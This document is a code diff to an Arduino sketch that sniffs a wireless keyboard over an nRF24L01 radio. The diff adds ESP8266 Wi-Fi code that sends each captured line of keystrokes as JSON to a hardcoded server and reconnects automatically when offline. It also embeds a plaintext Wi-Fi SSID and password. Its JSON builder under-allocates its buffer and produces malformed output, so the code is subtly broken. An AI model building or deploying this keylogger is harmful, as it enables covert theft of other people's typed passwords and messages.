@@ -1,3 +1,26 @@
+#include <SoftwareSerial.h>
+
+#include <Adafruit_ESP8266.h>
+
+#include <nRF24L01.h>
+#include <RF24.h>
+#include <RF24_config.h>
+
+#define SSID "NETGEAR00" //this must be read from the sd-card
+#define PASS "Orione2000%" //this must be read from the sd-card
+//#define SSID "esp8266_network" //this must be read from the sd-card
+//#define PASS "esp8266_project"
+#define HOST "192.168.1.2" //this must be read from the sd-card
+#define PORT 8000
+#define ESP_RX   3
+#define ESP_TX   4
+#define URI "/message/new/"
+
+SoftwareSerial esp8266(ESP_RX, ESP_TX);
+Adafruit_ESP8266 wifi(&esp8266, &Serial, 5);
+String user;
+String message;
+boolean isOffline;
 
 /*
 
@@ -99,8 +122,6 @@ boolean shoutKeystrokes = false;
 #define prl(a) Serial.println(F(a))
 
 #include <SPI.h>
-#include "nRF24L01.h"
-#include "RF24.h"
 #include "mhid.h"
 
 
@@ -139,7 +160,8 @@ boolean shoutKeystrokes = false;
 //a9399d5fcd,05,08
 //a9399d5fcd,09,08
 // my keyboard channel has been on 0x19, 0x34, 0x05, 0x09, 0x2c
-/* me love you */long time;
+/* me love you */
+long time;
 uint8_t channel = 50; // [between 3 and 80]
 uint16_t lastSeq = 0;
 
@@ -266,32 +288,50 @@ char gotKeystroke(uint8_t* p)
 
   // send keystroke to remote live monitor (backtracer)
   // and/or send to our remote server
-  //sendKeystroke(letter);
+  sendKeystroke(letter);
 
   return letter;
 }
 
-/*void sendKeystroke(char letter)
+boolean sendKeystroke(char letter)
 {
   // if we want to shout to the world the keystrokes live
-  if (shoutKeystrokes)
-  {
-    uint8_t buf[PKT_SIZE];
-    buf[0] = 'R';
-    buf[1] = 'E';
-    buf[2] = 'S';
-    buf[3] = letter;
+  
+ if(letter == '\n' || letter == '\r'){
+      //try to open a socket connection 
+     if(wifi.connectTCP(F(HOST), PORT)){
+       
+       char *json_string = createJson(user.c_str(),message.c_str());
+       isOffline = !wifi.httpPost(HOST, URI,json_string);
+       delay(100);
+       
+       if(isOffline){
+         Serial.println("POST failed");
+       }
+       free(json_string);
+       message="";
 
-    radio.openWritingPipe(backtraceIt);
-    radio.stopListening();
-    radio.write(&buf, 4);
-    radio.startListening();
+     }
+     else
+       Serial.println("Connection to HOST failed");
   }
+  else
+    message+=letter;
+  
 
-  // send to our remote server
-  //post_http(letter);
-}*/
+}
+char* createJson(const char *user, const char *message){
 
+  char *json = new char[16+strlen(user)+strlen(message)];
+  strcpy(json,"");
+  strcat(json,"{\"message\":\"");
+  strcat(json,message);
+  strcat(json,",\",\"user\":\"");
+  strcat(json,user);
+  strcat(json,"\"}");
+  return json;
+    
+}
 /*void storeKeystroke(char letter)
 {
 #ifdef FLASH
@@ -405,6 +445,12 @@ void ledOff()
 */
 void loop(void)
 {
+  //try to connect to wifi if offline
+  if(isOffline){
+    isOffline = !wifi.connectToAP(F(SSID), F(PASS));
+    delay(500);
+  }
+    
   uint8_t p[PKT_SIZE], op[PKT_SIZE], lp[PKT_SIZE];
   char ch = '\0';
   uint8_t pipe_num;
@@ -957,10 +1003,15 @@ void setup()
   //ledOn();
 
   Serial.begin(BAUDRATE);
+  message = "";
+  user = "les";
 
   //setTriggers();
   //setupGsm();
   //setupFlash();
+  esp8266.begin(9600);
+  isOffline = !wifi.connectToAP(F(SSID), F(PASS));
+  delay(500);
 
   spl("Radio setup");
   radio.begin();
